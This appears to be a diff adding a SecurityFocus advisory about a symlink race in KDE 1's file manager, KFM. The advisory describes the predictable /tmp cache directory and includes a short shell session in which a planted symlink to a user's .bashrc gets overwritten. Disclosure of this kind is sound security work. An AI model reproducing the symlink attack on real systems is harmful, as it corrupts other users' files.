@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/2629/info
+
+KFM is the KDE File Manager, included with version 1 of the KDE base package in most Linux installations. KFM is designed as a graphical, easily navigated interface to the Linux Filesystem.
+
+A problem with KFM could allow the overwriting of files owned by the KFM user. KFM insecurely creates a directory to store it's cache contents. Prior to creation, the existance of this directory, which is predictable in name, is not checked. Additionally, permissions are also not checked. Files beneath the directory can be created as symbolic links, making it possible to overwrite linked files.
+
+This vulnerability makes it possible for a local user to overwrite and corrupt files owned by the KFM user. 
+
+root@ps:/tmp/kfm-cache-500 > ls -la
+drwxrwxrwx 2 rws uboot 4096 Apr 18 21:18 .
+drwxrwxrwt 15 root root 770048 Apr 18 21:16 ..
+lrwxrwxrwx 1 rws uboot 18 Apr 18 21:18 index.html ->
+/home/paul/.bashrc
+-rw-r--r-- 1 rws uboot 0 Apr 18 21:16 index.txt
+
+root@ps:/tmp/kfm-cache-500 > ls -la /home/paul/.bashrc
+-rw-r--r-- 1 paul users 1458 Jan 23 13:56
+/home/paul/.bashrc
+
+
+and after running kfm as user 500:
+
+root@ps:/tmp/kfm-cache-500 > ls -la /home/paul/.bashrc
+-rw-r--r-- 1 paul users 271 Apr 18 21:19
+/home/paul/.bashrc
+
